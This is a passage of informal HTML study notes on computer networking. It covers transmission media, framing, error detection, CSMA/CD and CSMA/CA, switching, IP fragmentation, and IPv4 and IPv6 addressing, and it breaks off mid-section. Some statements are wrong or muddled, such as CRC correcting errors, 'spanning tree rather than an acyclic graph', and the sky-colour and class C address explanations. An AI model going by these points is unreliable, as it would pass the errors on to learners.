src="Untitled%2017.png"/></a></figure></details></li></ul><ul id="11e1a926-7344-809d-93e0-cb0e837b3663" class="toggle"><li><details><summary>Transmission Mediums </summary><h3 id="11f1a926-7344-804c-a3ee-e06357a7c6d3" class="">Guided Media</h3><figure id="11f1a926-7344-8022-948b-d4bebaeceaa9" class="image"><a href="Untitled%2018.png"><img style="width:623.96875px" src="Untitled%2018.png"/></a></figure><h3 id="11f1a926-7344-80b2-8ddd-e4f70ade91d1" class="">Unguided Media</h3><p id="11f1a926-7344-8065-aebb-fc345b76bccb" class="">air, atmosphere, space (microwave links, Infrared, wifi links, wimax links, cellular/mobile communication)</p><ul id="11f1a926-7344-8063-b9e4-f5bb312f655c" class="bulleted-list"><li style="list-style-type:disc">everything below visible range on the electromagnetic spectrum is non ionizing: 5g cannot cause cancer </li></ul><ul id="11f1a926-7344-8004-9d5f-eef40f87d2b9" class="bulleted-list"><li style="list-style-type:disc">antenna has to be quarter of the wavelength long (higher the frequency the smaller the antenna)</li></ul><ul id="11f1a926-7344-8056-8922-c56ae18ab465" class="bulleted-list"><li style="list-style-type:disc">electromagnetic waves tend to interact significantly with objects that are comparable in size to their wavelength (thats why the sky is blue)</li></ul><ul id="11f1a926-7344-80c6-96e2-d3638742cbd5" class="bulleted-list"><li style="list-style-type:disc">the higher the frequency the more line of sight it behaves (signal doesn’t bend over objects anymore, antenna’s must see each other)</li></ul><figure id="11f1a926-7344-80a5-9a8e-fdabd3b559f3" class="image"><a href="Untitled%2019.png"><img style="width:623.984375px" src="Untitled%2019.png"/></a></figure><figure id="11f1a926-7344-80d9-9f47-f4393d2493e8" class="image"><a href="Untitled%2020.png"><img style="width:652px" src="Untitled%2020.png"/></a></figure><figure id="11f1a926-7344-802a-87b0-c00f6dea18b1" class="image"><a href="Untitled%2021.png"><img style="width:623.96875px" src="Untitled%2021.png"/></a></figure></details></li></ul></details></li></ul><ul id="11e1a926-7344-809f-b221-f27dfdb0267c" class="toggle"><li><details><summary>Data Link Layer (L2)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-80c4-996c-f85182308014"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="2bcb58e3-13c9-4785-b4b6-d1c7064eebd5" class="">data link layer solves the <mark class="highlight-yellow">framing</mark>, <mark class="highlight-yellow">error detection</mark> and <mark class="highlight-yellow">media access control </mark>problems of the physical layer</p></div></figure><ul id="11f1a926-7344-809e-bf1e-c756afb0a333" class="toggle"><li><details><summary>Framing</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-80a9-92f2-c759c83bdc3e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6c74c0ff-6653-4107-bdc6-7a1eade108b5" class=""><mark class="highlight-yellow_background">determining </mark>the <mark class="highlight-yellow_background">beginning and end of</mark> a received <mark class="highlight-yellow_background">datagram </mark><br/>data frame is a sequence of bits that form a unit of data<br/></p></div></figure><h2 id="11f1a926-7344-809a-bfc5-f7b4a848844b" class="">Framing Approaches</h2><h3 id="11f1a926-7344-8027-b818-d91a6be8ea2a" class="">1) <mark class="highlight-yellow_background">Flag</mark>/Sentinel Bytes</h3><p id="11f1a926-7344-80cc-84b3-e67b668a09ba" class=""> special byte label the start and end of a data frame</p><ul id="11f1a926-7344-8027-a2ae-e5b1d4e3cddb" class="bulleted-list"><li style="list-style-type:disc">eg: 0111 1110 for start and 0111 1110 for end</li></ul><p id="11f1a926-7344-8055-84dc-f4f476a7d65b" class="">problem is that the message can contain the special bit, causing early termination</p><p id="11f1a926-7344-8046-b802-ed8a1b8dec32" class="">this can be fixed by bit stuffing the end with a 0. encoder will remove the first 0 and the actual 0 is after</p><h3 id="11f1a926-7344-803b-9510-e264ebad473a" class="">2) <mark class="highlight-yellow_background">Header</mark></h3><p id="11f1a926-7344-80a9-a217-f22a5920a50c" class="">length/size specifier of message can be included in the header</p><p id="11f1a926-7344-80f0-9553-df91ec851aac" class="">problem is that an error affecting this specifier will cause the rest of the message to be unreadable</p><h3 id="11f1a926-7344-80f3-8310-d551531b2d55" class="">3) <mark class="highlight-yellow_background">Clock</mark></h3><p id="11f1a926-7344-8090-b8bb-e3d21f7cd4fc" class="">the size of the data frame is fixed and we attach a clock in the header to sync the sender and receiver </p><h2 id="11f1a926-7344-8017-8603-eedac9392bf1" class="">Header &amp; Tail</h2><p id="11f1a926-7344-805b-9fbb-e17f5b3382e4" class="">data frame requires redundant information to be stored at the beginning and ending</p><p id="11f1a926-7344-806b-8dbc-c39a4e59e473" class="">additional information can be sored in the header, such as CRC for error detection</p><figure id="11f1a926-7344-8045-9b71-c15a53c70c3b" class="image"><a href="Untitled%2022.png"><img style="width:533.921875px" src="Untitled%2022.png"/></a></figure></details></li></ul><ul id="11f1a926-7344-803d-851a-e566a5ce4ec5" class="toggle"><li><details><summary>Error Detection</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8009-864b-d3ed86f157f8"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6a39d74a-1500-428d-9f2e-dd7f85c919bb" class="">received datagram/bits may contain errors </p></div></figure><h1 id="11f1a926-7344-80c3-a70b-cebdadc3cfed" class="">Detection Approaches</h1><h3 id="11f1a926-7344-8012-8e5c-c39761feab7b" class="">1) <mark class="highlight-yellow_background">Parity Check</mark></h3><p id="11f1a926-7344-8008-9da2-c9169a9a8934" class="">for each byte, store 7 actual bits and 1 parity bit</p><p id="11f1a926-7344-808e-a00c-d74d8fa66cf1" class="">checking the parity bit for a valid pattern (eg: even or odd parity) checks if there is an error</p><p id="11f1a926-7344-80e6-b36a-d390886b9d5b" class="">problem with parity checks is that even if the parity is correct, doesn’t mean there aren’t errors in the rest of the bits</p><figure id="11f1a926-7344-8069-ad0a-c8511e6ad853" class="image"><a href="image%2028.png"><img style="width:336px" src="image%2028.png"/></a></figure><h3 id="11f1a926-7344-80b5-9633-d563559c7f49" class="">2) <mark class="highlight-yellow_background">Checksum</mark></h3><p id="11f1a926-7344-800f-a363-dd4bc0a0e9ff" class="">checksum operation adds up all the words and gives the resulting sum</p><p id="11f1a926-7344-806f-9775-fa2bad7327b8" class="">transmitter performs the checksum operation and sends the result along-side the message</p><p id="11f1a926-7344-8027-a53c-e4a1fe74f802" class="">receiver also performs the checksum operation and compares the result with the sent result to ensure there are no errors</p><p id="11f1a926-7344-80d8-b2c3-d63a8dae0d41" class="">if there is a corruption, the receiver side checksum and sent sum will not match</p><p id="11f1a926-7344-80b3-86c0-f183cecad66c" class="">the chance that the sum is corrupted but still matches is very low</p><h3 id="11f1a926-7344-805e-8562-ce0bf66f1b49" class="">3) <mark class="highlight-yellow_background">CRC </mark>(Cyclic Redundancy Check)</h3><p id="11f1a926-7344-8041-9073-cc8f13b624db" class="">similar to checksum</p><p id="11f1a926-7344-80fe-b708-ecc070e2cd15" class="">uses math that makes the chance of sum corruption still matching even lower</p><p id="11f1a926-7344-801d-b757-d332dab2ce4a" class="">also deals with “burst” errors</p><h1 id="11f1a926-7344-8044-826d-fa3914430314" class="">Error Correction</h1><p id="11f1a926-7344-80f6-8502-d508f825a5b4" class="">redundancies codes (including CRC) can correct errors up to a certain number of bits</p><ul id="11f1a926-7344-80cc-9543-fd02ea5b90cd" class="bulleted-list"><li style="list-style-type:disc">there are better codes that can handle more bits (hamming, reed Solomon) </li></ul><ul id="11f1a926-7344-805d-b0b4-d8356e66ffae" class="bulleted-list"><li style="list-style-type:disc">Forward Error Correction(FEC): they are not always preferred because not only more bits have to be sent, they also require more bits to be sent all the time</li></ul><ul id="11f1a926-7344-80d4-890d-fb4d8d5d0789" class="bulleted-list"><li style="list-style-type:disc">only used in high error rate and high accuracy environments such as Mars</li></ul><figure id="11f1a926-7344-80ba-a66b-dab4bba8bc34" class="image"><a href="image%2029.png"><img style="width:555px" src="image%2029.png"/></a></figure></details></li></ul><ul id="11f1a926-7344-8051-93e3-fad690d7b499" class="toggle"><li><details><summary>Media Access Control</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-80ae-97c0-fec64c36fa44"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="90f39292-16ab-4714-b05a-6c651c6b0eba" class="">preventing <mark class="highlight-orange_background">conflict</mark> <mark class="highlight-orange_background">between </mark>multiple <mark class="highlight-orange_background">nodes </mark>on the <mark class="highlight-orange_background">same link</mark></p></div></figure><h1 id="11f1a926-7344-8005-b341-e577aab08111" class="">Access Mediation Conflicts Prevention</h1><h3 id="11f1a926-7344-8080-80e7-fdc2f0d0a332" class="">Channel <mark class="highlight-orange_background">Partitioning </mark>(naive approach)</h3><p id="11f1a926-7344-8066-8b5a-e01bd91143b7" class="">avoiding conflict by partition the chancel and people <mark class="highlight-orange_background">using only a specific part </mark>of it</p><ul id="11f1a926-7344-805e-8818-faf1c6477779" class="bulleted-list"><li style="list-style-type:disc">Time Division: can only use the channel at certain times</li></ul><ul id="11f1a926-7344-80e0-94e3-e45d0dd17e70" class="bulleted-list"><li style="list-style-type:disc">Frequency Division: can only use the channel at a certain frequency</li></ul><p id="11f1a926-7344-808a-80f0-e6f8aa3eb1ff" class="">issue with partitioning is it requires a centralized coordinator</p><figure id="11f1a926-7344-80e9-88f7-ded7f673360d" class="image"><a href="Untitled%2023.png"><img style="width:567.984375px" src="Untitled%2023.png"/></a></figure><h3 id="11f1a926-7344-8001-96b5-c4479227ce20" class=""><mark class="highlight-orange_background">Carrier Sensing</mark> Multiple Access/Collision <mark class="highlight-orange_background">Detection </mark>(CSMA/CD)</h3><p id="11f1a926-7344-8014-b2d6-f46baa56ba5b" class="">listen to the link if there is a carrier/link is busy, if its busy then wait until its idle</p><p id="11f1a926-7344-8036-80c4-c98fe7ef8017" class="">when a node starts transmitting, it has collision detection to know if another node starts sending at the same time to prevent collision</p><ul id="11f1a926-7344-80dd-83ef-c1dda9c12643" class="bulleted-list"><li style="list-style-type:disc">provides a decentralized medium</li></ul><ul id="11f1a926-7344-80d8-bd95-ec65becce766" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-orange_background">exponential back off</mark> (waiting exponentially longer random amount of time after collision detection) <p id="11f1a926-7344-80c0-8adf-d6db0af00961" class="">is used to prevent 2 nodes on the same link waiting for each other to send a message so the link is idle</p></li></ul><h3 id="11f1a926-7344-804e-acc0-e6131d81c703" class=""><mark class="highlight-orange_background">Carrier Sensing</mark> Multiple Access/Collision <mark class="highlight-orange_background">Avoidance </mark>(CSMA/CA)</h3><p id="11f1a926-7344-8094-bd62-f9997283f8de" class="">hidden node problem states that collision detection doesn’t work on wireless due to nodes not hearing an ongoing transmission</p><ul id="11f1a926-7344-802b-90ed-edd6ae8c89a0" class="bulleted-list"><li style="list-style-type:disc">instead Collision Avoidance is done by the receiver sending an <mark class="highlight-orange_background">ACK </mark>packet back to the sender to know if the packet was successfully decoded </li></ul><ul id="11f1a926-7344-80a4-9a5d-e5205156d91d" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-orange_background">RTS-CTS</mark> (Ready to Send/Clear to Send) is sent by the receiver to tell how long the sender should wait before sending another packet</li></ul><h1 id="11f1a926-7344-80f3-8d2b-fc0b093453be" class="">Media Access Control (MAC) Address</h1><p id="11f1a926-7344-80b3-a92a-ef0d09ec31b4" class="">unique <mark class="highlight-orange_background">address </mark>to <mark class="highlight-orange_background">distinguish which node</mark> the datagram comes from</p><figure id="11f1a926-7344-80b6-b483-d759cde62aad" class="image"><a href="Untitled%2024.png"><img style="width:624px" src="Untitled%2024.png"/></a></figure><ul id="11f1a926-7344-805c-a380-c1ade31a0655" class="bulleted-list"><li style="list-style-type:disc">source/destination MAC address is stored in the header of a datagram</li></ul><ul id="11f1a926-7344-808e-924e-fae2b4a94e26" class="bulleted-list"><li style="list-style-type:disc">source is attached so the receiver can message back</li></ul><ul id="11f1a926-7344-806b-ab75-fa1300f35838" class="bulleted-list"><li style="list-style-type:disc">uniqueness is handled by the manufacturer  </li></ul><ul id="11f1a926-7344-8027-a7d8-cdadc3ac0e9b" class="bulleted-list"><li style="list-style-type:disc">uniqueness/address can be spoofed</li></ul></details></li></ul></details></li></ul><ul id="11e1a926-7344-80e5-a403-c328c253c993" class="toggle"><li><details><summary>Network Layer (L3)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8049-a01a-e733fb2d9884"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="0c18d9b0-940a-455d-95da-ace02df219e7" class="">network layer <mark class="highlight-yellow">connects multiple nodes</mark> to form a network and <mark class="highlight-yellow">provide routing</mark></p></div></figure><ul id="11f1a926-7344-801e-9b8f-eef4e3cd0156" class="toggle"><li><details><summary>Local Area Network (LAN)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8077-9314-d41b957fb2ef"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="34f9edc3-65ab-4cb5-8d4e-de99edb63187" class="">network of locally interconnected nodes within a limited geographic area</p></div></figure><ul id="11f1a926-7344-80f2-97df-c56c4786426c" class="toggle"><li><details><summary>Switch</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-80fe-bf93-e2cfb029cc48"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="af630234-ae4b-4b79-93d9-42fea797674a" class="">layer 2 device that interconnects links by forwarding datagrams to the correct destination </p><ul id="11f1a926-7344-80fa-8cf9-e90a5336c0be" class="bulleted-list"><li style="list-style-type:disc">uses a store &amp; forwarding table to direct datagrams from its input interface to the next output interface</li></ul><ul id="11f1a926-7344-805d-9728-f5617f57254d" class="bulleted-list"><li style="list-style-type:disc">separates collision domains</li></ul><ul id="11f1a926-7344-80fe-ab00-c2b45e72bd6a" class="bulleted-list"><li style="list-style-type:disc">implements AMP for each interface</li></ul><ul id="11f1a926-7344-809a-a1bf-e40b54f51e0e" class="bulleted-list"><li style="list-style-type:disc">stores datagrams</li></ul><ul id="11f1a926-7344-807d-8997-ef18c7e061c6" class="bulleted-list"><li style="list-style-type:disc">better capacity than hub</li></ul><figure id="11f1a926-7344-803b-8c85-e7f084146d72" class="image"><a href="image%2030.png"><img style="width:336px" src="image%2030.png"/></a></figure></div></figure></details></li></ul><ul id="11f1a926-7344-80c1-98c7-c1054d0ae65e" class="toggle"><li><details><summary>Hub</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-809c-9739-ffce31a104f0"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="b4b9d8cf-0778-4e56-b75f-445fb4bece90" class=""><mark class="highlight-yellow_background">layer 1 device</mark>, similar to a switch but that simply <mark class="highlight-yellow_background">repeats symbols on its input interface to all its output interfaces</mark></p><ul id="11f1a926-7344-8044-874e-dffe63599f4a" class="bulleted-list"><li style="list-style-type:disc">all links on the same collision domain</li></ul><ul id="11f1a926-7344-8002-83f9-d0a29c1802cb" class="bulleted-list"><li style="list-style-type:disc">less capacity than switch </li></ul></div></figure></details></li></ul><ul id="11f1a926-7344-8062-b236-fe2334b4715d" class="toggle"><li><details><summary>Star Topology</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1261a926-7344-805d-8626-e503a9f22062"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="4e902b58-91bc-4858-a159-53819062a766" class="">a network can be ran by interconnecting nodes with multiple switches</p><p id="1261a926-7344-80a2-b168-e1f02a496fc6" class="">interconnecting switches account for its limited number of input and output interfaces while not necessary reducing network performance</p></div></figure></details></li></ul><ul id="11f1a926-7344-80ea-8404-c607553a7eb5" class="toggle"><li><details><summary>Switching</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8064-9ea4-f0badcd5663b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="53b76342-49fb-488e-83d2-568d26f8494b" class=""><mark class="highlight-yellow_background">process of forwarding datagrams</mark> to the next output interface (switch)</p><ul id="11f1a926-7344-80c3-8aea-ec34b57c67bc" class="bulleted-list"><li style="list-style-type:disc">based on the destination MAC address</li></ul><ul id="11f1a926-7344-8030-a38e-ed2ef36a8c2c" class="bulleted-list"><li style="list-style-type:disc">table is either hardcoded or automatically learnt</li></ul><ul id="11f1a926-7344-8029-9190-d87af00b5506" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow_background">forwarding table is learnt </mark>by training on <mark class="highlight-yellow_background">new connections</mark><ul id="11f1a926-7344-8037-8e7d-f2f447f9a291" class="bulleted-list"><li style="list-style-type:circle">table only stores latest information, <mark class="highlight-yellow_background">forgets old info</mark></li></ul><ul id="11f1a926-7344-8003-93db-ce0ba8d962fa" class="bulleted-list"><li style="list-style-type:circle">doesn’t hardcode values forever</li></ul><ul id="11f1a926-7344-8043-81f4-c6e0b7ed7705" class="bulleted-list"><li style="list-style-type:circle">if switch doesn’t have an answer, it broadcast the question across the network to learn (only works if there is no loop)</li></ul></li></ul></div></figure><h3 id="11f1a926-7344-8058-83ca-d34295a71cba" class="">Connectionless vs Connected</h3><table id="11f1a926-7344-80a1-8a9f-c7b39f9bf9fd" class="simple-table"><tbody><tr id="0d01db95-ca37-4012-9e91-7690a4d8c4cc"><td id="Vbze" class="">Connectionless </td><td id="@BvY" class="">Connected</td></tr><tr id="d994f81d-37f8-4e6c-b31e-830e4cc4366a"><td id="Vbze" class="">there is <mark class="highlight-yellow_background">no end-to-end connection </mark>between source and destination</td><td id="@BvY" class="">connection state <mark class="highlight-yellow_background">needs to be established</mark> before datagrams are sent  </td></tr><tr id="2873ae30-56ab-404d-a5ec-b615ea2c5b60"><td id="Vbze" class="">packets are <mark class="highlight-yellow_background">forwarded independently</mark> meaning they may travel in different paths</td><td id="@BvY" class="">packets are <mark class="highlight-yellow_background">apart of a sequence/stream</mark> and follow the same path</td></tr><tr id="11f1a926-7344-804b-86c4-c341c86dcbd8"><td id="Vbze" class="">a switch/hub <mark class="highlight-yellow_background">failure doesn’t</mark> break the network and <mark class="highlight-yellow_background">affect the delivery</mark> of packets by updating the forwarding table</td><td id="@BvY" class="">a switch/hub <mark class="highlight-yellow_background">failure </mark>affects the connection and may <mark class="highlight-yellow_background">prevents delivery</mark></td></tr></tbody></table><h1 id="11f1a926-7344-80ca-911a-fff418a22c8e" class="">Switching Techniques to use forwarding tables</h1><h3 id="11f1a926-7344-803b-836b-ec24355f9e4b" class="">1. Datagrams (connectionless)</h3><p id="11f1a926-7344-80c4-9f09-f16e6a661a79" class="">include the destination MAC address to every datagram to enable any switch to decide how to get it to its destination using its forwarding table</p><figure id="11f1a926-7344-8087-a08e-cc128e9dcc0f" class="image"><a href="Untitled%2025.png"><img style="width:595.984375px" src="Untitled%2025.png"/></a><figcaption>eg: if switch 3 gets a datagram with dest A, then it uses port 0</figcaption></figure><h3 id="11f1a926-7344-8071-9514-d62700ec5a83" class="">2. Virtual Circuit (connected)</h3><p id="11f1a926-7344-803d-9c4d-e2787411d161" class="">a virtual circuit is set up to establish a connection between source and destination for datagrams to travel </p><ul id="11f1a926-7344-8001-afa4-fc072b31cbc9" class="bulleted-list"><li style="list-style-type:disc">VC guarantees there is a route from host to dest by the time data is being sent from the connection phase</li></ul><ul id="11f1a926-7344-80b7-acf1-d8d2557315ab" class="bulleted-list"><li style="list-style-type:disc">connection setup phase finds a path/virtual circuit between source and destination<ul id="11f1a926-7344-80fd-9854-ec9c444259b8" class="bulleted-list"><li style="list-style-type:circle">switch keeps track of ongoing connections in a virtual circuit table </li></ul><ul id="11f1a926-7344-803d-991f-d880cc5e485b" class="bulleted-list"><li style="list-style-type:circle">each switch makes a virtual circuit identifier for its path to uniquely identify the connection</li></ul></li></ul><ul id="11f1a926-7344-8001-8c62-f3ffb4f940d1" class="bulleted-list"><li style="list-style-type:disc">data transfer phase forwards packets to the correct output interface based on the virtual circuit identifier<ul id="11f1a926-7344-8059-8d45-e4f601345028" class="bulleted-list"><li style="list-style-type:circle">all packets will follow this path</li></ul></li></ul><figure id="11f1a926-7344-80af-af7d-cf79866d0076" class="image"><a href="Untitled%2026.png"><img style="width:596px" src="Untitled%2026.png"/></a></figure><figure id="11f1a926-7344-8002-833e-f646554cce88" class="image"><a href="Untitled%2027.png"><img style="width:539.953125px" src="Untitled%2027.png"/></a></figure><h3 id="11f1a926-7344-801d-b687-c01850a01957" class="">3. Source Routing</h3><p id="11f1a926-7344-80af-8bdc-c4b47a5a54b3" class="">route from src to dest (network topology) is provided by the source host encoded in the packet as a list of ports</p><p id="11f1a926-7344-8057-8253-eb5f899f96ac" class="">job of the switch is just to pop the first port from the list and forward the packet based on the value. </p><p id="11f1a926-7344-80bc-b7ef-d2da2a526f85" class="">popped value is appended to the end of the list so the destination can use the reversed list to get back to the sender</p><figure id="11f1a926-7344-80cd-98aa-d20fb779f397" class="image"><a href="Untitled%2028.png"><img style="width:567.984375px" src="Untitled%2028.png"/></a></figure><figure id="11f1a926-7344-8017-9051-dff8409d7df1" class="image"><a href="Untitled%2029.png"><img style="width:624px" src="Untitled%2029.png"/></a></figure><h1 id="11f1a926-7344-80cd-8437-e51245b2374c" class="">Loops</h1><p id="11f1a926-7344-8098-98c1-c94626ae1afd" class=""><del>the broadcast a switch does to ask for up to date information for forwarding tables only works if there are no loops in the network</del></p><p id="11f1a926-7344-8091-bea7-e5a9b66c5ad2" class="">loops in the network can cause packets to get stuck in an infinite loop and not reach the dest</p><p id="11f1a926-7344-806b-b404-e9eaa1926720" class="">to remove loops, make the network a spanning tree rather than an acyclic graph</p><figure id="0924e95d-e7a7-4e7d-8d24-6a02ab4f003a" class="image"><a href="Untitled%2030.png"><img style="width:567.96875px" src="Untitled%2030.png"/></a></figure><figure id="11f1a926-7344-80f4-88ce-e7503b20a7e4" class="image"><a href="Untitled%2031.png"><img style="width:595.96875px" src="Untitled%2031.png"/></a></figure></details></li></ul></details></li></ul><ul id="11f1a926-7344-803e-b48a-fdc376a9a386" class="toggle"><li><details><summary>Inter Networking &amp; Internet Protocol</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-80fc-bbe6-dd333c3c35d9"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="1bbce5b3-b564-4e2d-9e20-77ede2b32d6d" class="">a network made up of smaller networks</p><ul id="11f1a926-7344-80c1-a0a0-fa10bc657e18" class="bulleted-list"><li style="list-style-type:disc">switches cannot connect networks globally </li></ul><ul id="11f1a926-7344-807f-b6e5-d2b3b74459e4" class="bulleted-list"><li style="list-style-type:disc">layer 3 internet protocol provides routing that scales to the entire globe</li></ul><ul id="11f1a926-7344-80bc-bd45-ef40f3cc2c44" class="bulleted-list"><li style="list-style-type:disc">nodes that interconnect networks are called routers</li></ul><figure id="11f1a926-7344-80de-a220-f89a3474d4be" class="image"><a href="Untitled%2032.png"><img style="width:288px" src="Untitled%2032.png"/></a></figure></div></figure><ul id="11f1a926-7344-800d-b2fa-e28851d806c6" class="toggle"><li><details><summary>Internet Protocol</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8079-8caa-efa35a49586f"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="125e16d5-dc35-4c35-997a-37b628209b5b" class="">layer 3 protocol providing routing</p><ul id="11f1a926-7344-8077-b2c0-ff4a24680fef" class="bulleted-list"><li style="list-style-type:disc">best effort service model (no guarantee of delivery)</li></ul><ul id="11f1a926-7344-8016-a1e7-ec39b15b2796" class="bulleted-list"><li style="list-style-type:disc">doesn’t attempt/provide failure recovery (packets can be lost) </li></ul><ul id="11f1a926-7344-806b-b9fd-d6c206c84746" class="bulleted-list"><li style="list-style-type:disc">unreliable but routers do a simple task, no need for complicated functionality </li></ul><ul id="11f1a926-7344-801a-9904-c5ffd4be9ec0" class="bulleted-list"><li style="list-style-type:disc">IP is able to work with any L2 technology/protocol </li></ul><figure id="11f1a926-7344-80a7-970c-ebe1072e7109" class="image"><a href="cd6bd40b-1ba7-4497-bff1-c0feeb05c77c.png"><img style="width:707.984375px" src="cd6bd40b-1ba7-4497-bff1-c0feeb05c77c.png"/></a></figure></div></figure><h3 id="11f1a926-7344-8085-a968-f8fb7419abca" class="">IP Packet Structure</h3><p id="11f1a926-7344-8013-9c4c-ebf475522ccd" class="">scalable routing is provided using hierarchical addressing scheme and connectionless data delivery</p><ul id="11f1a926-7344-806d-870b-f1e27f891520" class="bulleted-list"><li style="list-style-type:disc">high level protocol: tcp or udp</li></ul><ul id="11f1a926-7344-8058-a088-c55555a099e7" class="bulleted-list"><li style="list-style-type:disc">time to live/hop limit (counter that is decremented each hop) is used to prevent packets from going into a infinite loop</li></ul><figure id="11f1a926-7344-809e-9f7b-d97fb8fb2000" class="image"><a href="Untitled%2033.png"><img style="width:568.13916015625px" src="Untitled%2033.png"/></a></figure></details></li></ul><ul id="11f1a926-7344-80a1-ac49-ee559fbd3119" class="toggle"><li><details><summary>Fragmentation and Reassembly</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8024-b01b-e0ad45ba2d50"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6c75939b-bc64-48d0-b910-9889c782c01c" class="">process of breaking down and reconstructing an IP packet that is larger than the MTU (maximum transmission unit) that the network can carry</p><ul id="11f1a926-7344-80f4-879e-f5a89c2f2d86" class="bulleted-list"><li style="list-style-type:disc">allows flexibly to use both IPv4 and IPv6 </li></ul><ul id="11f1a926-7344-80c8-a64e-c76fad96256f" class="bulleted-list"><li style="list-style-type:disc">1 bit represents if the datagram is fragmented or not to determine if reassembly is required</li></ul><ul id="11f1a926-7344-8041-8c95-db6937b08974" class="bulleted-list"><li style="list-style-type:disc">fragmentation should be avoided due to latency and overhead </li></ul><figure id="11f1a926-7344-80d6-9197-c867239c271b" class="image"><a href="Untitled%2034.png"><img style="width:568.13916015625px" src="Untitled%2034.png"/></a></figure><figure id="11f1a926-7344-807e-976d-f6f7df81ee01" class="image"><a href="Untitled%2035.png"><img style="width:481px" src="Untitled%2035.png"/></a></figure></div></figure></details></li></ul><ul id="11f1a926-7344-80b6-a2ec-e5185fb480d8" class="toggle"><li><details><summary>IPv4</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-8027-85f2-cbf30983244b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="8eb79988-e3de-4572-8ec3-0ad2fa084dc2" class="bulleted-list"><li style="list-style-type:disc">address is a 32 bit number</li></ul><ul id="1201a926-7344-8003-80d6-d368105a6733" class="bulleted-list"><li style="list-style-type:disc">global address are unique</li></ul><figure id="11f1a926-7344-8072-8b02-c43d1e46a694" class="image"><a href="4137f915-9abe-479c-b8c4-07db4e50a735.png"><img style="width:586.8571428571429px" src="4137f915-9abe-479c-b8c4-07db4e50a735.png"/></a></figure><ul id="1201a926-7344-80d3-8528-fcd82b697820" class="bulleted-list"><li style="list-style-type:disc">has a network and host part (hierarchical)<ul id="1201a926-7344-80eb-a54e-e3cc6634e4d2" class="bulleted-list"><li style="list-style-type:circle">all address on the same network have the same prefix/network part</li></ul><ul id="1201a926-7344-80b6-b323-d4e531ef5c70" class="bulleted-list"><li style="list-style-type:circle">host part is to distinguish between different nodes in the network</li></ul></li></ul><ul id="1201a926-7344-8065-bf9a-e31ba91c3287" class="bulleted-list"><li style="list-style-type:disc">IP address are divided into 3 classes: A, B, C<ul id="1201a926-7344-807e-8d4c-d1f8e48ecd81" class="bulleted-list"><li style="list-style-type:circle">A is mostly host, C is mostly network, B is even</li></ul></li></ul><figure id="1201a926-7344-80cb-80ed-c8f4f6146124" class="image"><a href="30ce40d0-9b38-4c93-8258-916db0ab0f6a.png"><img style="width:508.235294117647px" src="30ce40d0-9b38-4c93-8258-916db0ab0f6a.png"/></a><figcaption>2^8 possible class C IP addresses in a network<br/>-2 for the router<br/></figcaption></figure><ul id="1201a926-7344-80c3-b502-c7f1e92ed8b8" class="bulleted-list"><li style="list-style-type:disc">nodes on the same network/subnet can communicate at the L2 level (without a router)</li></ul><ul id="1201a926-7344-8034-8c74-e00c06d126ba" class="bulleted-list"><li style="list-style-type:disc">IANA (Internet Assigned Numbers Authority) organization standardized IP address allocation to guarantee global uniqueness in the early 1980s</li></ul><ul id="1201a926-7344-807b-9430-da1cff5e3734" class="bulleted-list"><li style="list-style-type:disc">classes for IP are not used to allow route aggregation from an ISP<figure id="1201a926-7344-80fe-94b4-ced5275ac2ed" class="image"><a href="Untitled%2036.png"><img style="width:568.125px" src="Untitled%2036.png"/></a></figure></li></ul></div></figure></details></li></ul><ul id="11f1a926-7344-806e-b7c9-e5f0059de862" class="toggle"><li><details><summary>IPv6</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11f1a926-7344-80b7-8e4f-eff5b9b8dc2d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="11f1a926-7344-80ea-837e-dbd480622f04" class="bulleted-list"><li style="list-style-type:disc">IPv4 was not enough IPs to go around</li></ul><ul id="11f1a926-7344-8025-9008-c6e29bc6926d" class="bulleted-list"><li style="list-style-type:disc">ipv6’s purpose was to give more IPs, enough to last forever<ul id="1201a926-7344-80bb-ae52-cf5c9edd7688" class="bulleted-list"><li style="list-style-type:circle">128 bits instead of 32</li></ul><ul id="1201a926-7344-8002-a95f-df4b1831030e" class="bulleted-list"><li style="list-style-type:circle">2^128 ipv6 addresses</li></ul></li></ul><figure id="11f1a926-7344-809c-8737-fd2bf6a19d6f" 